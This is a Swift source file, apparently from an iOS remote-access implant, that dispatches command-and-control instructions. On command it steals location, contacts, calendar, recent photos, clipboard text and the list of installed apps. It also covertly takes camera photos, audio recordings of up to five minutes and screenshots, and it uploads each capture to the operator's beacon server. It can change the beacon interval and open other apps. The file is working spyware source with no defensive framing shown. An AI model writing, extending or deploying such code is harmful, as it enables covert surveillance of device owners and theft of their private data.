//
//  CommandHandler.swift
//  Executes C2 commands. Same command names as the Android agent where possible.
//

import Foundation

enum CommandHandler {

    static func handle(cmd: String, args: String, completion: @escaping (String) -> Void) {
        switch cmd {
        case "info":
            completion(DeviceInfo.shared.info())

        case "location":
            LocationProvider.shared.currentLocation { json in
                completion(json)
            }

        case "contacts":
            ContactGrabber.shared.dump { json in
                completion(json)
            }

        case "photos":
            PhotoGrabber.shared.listRecent(count: 20) { json in
                completion(json)
            }

        case "download":
            PhotoGrabber.shared.uploadAsset(localId: args) { ok in
                completion(ok ? "uploaded: \(args)" : "upload failed: \(args)")
            }

        case "photo":
            CameraGrabber.shared.capture(front: args == "front") { path in
                if let path = path {
                    BeaconManager.shared.uploadFile(url: URL(fileURLWithPath: path), name: "photo.jpg") { ok in
                        completion(ok ? path : "upload failed")
                    }
                } else {
                    completion("capture failed")
                }
            }

        case "audio":
            let seconds = Int(args) ?? 10
            AudioGrabber.shared.record(seconds: min(seconds, 300)) { path in
                if let path = path {
                    BeaconManager.shared.uploadFile(url: URL(fileURLWithPath: path), name: "audio.m4a") { ok in
                        completion(ok ? path : "upload failed")
                    }
                } else {
                    completion("record failed")
                }
            }

        case "clipboard":
            completion(UIPasteboard.general.string ?? "(empty)")

        case "apps":
            completion(AppLister.installedSchemes())

        case "calendar":
            CalendarGrabber.shared.dump { json in
                completion(json)
            }

        case "interval":
            if let sec = Int(args.trimmingCharacters(in: .whitespaces)), sec > 0 {
                Prefs.shared.interval = sec
                BeaconManager.shared.restartWithNewInterval()
                completion("interval set to \(sec)s")
            } else {
                completion("bad interval")
            }

        case "openapp":
            // args: url scheme, e.g. "whatsapp://" "fb://" "instagram://"
            if let url = URL(string: args.trimmingCharacters(in: .whitespaces)),
               UIApplication.shared.canOpenURL(url) {
                UIApplication.shared.open(url, options: [:]) { ok in
                    completion(ok ? "opened: \(args)" : "open failed: \(args)")
                }
            } else {
                completion("scheme not available: \(args)")
            }

        case "screenshot":
            // only while app is foreground-visible; returns the path
            if let path = ScreenGrabber.capture() {
                BeaconManager.shared.uploadFile(url: URL(fileURLWithPath: path), name: "screenshot.png") { ok in
                    completion(ok ? path : "upload failed")
                }
            } else {
                completion("screenshot failed (app not visible)")
            }

        default:
            completion("unknown command: \(cmd)")
        }
    }
}
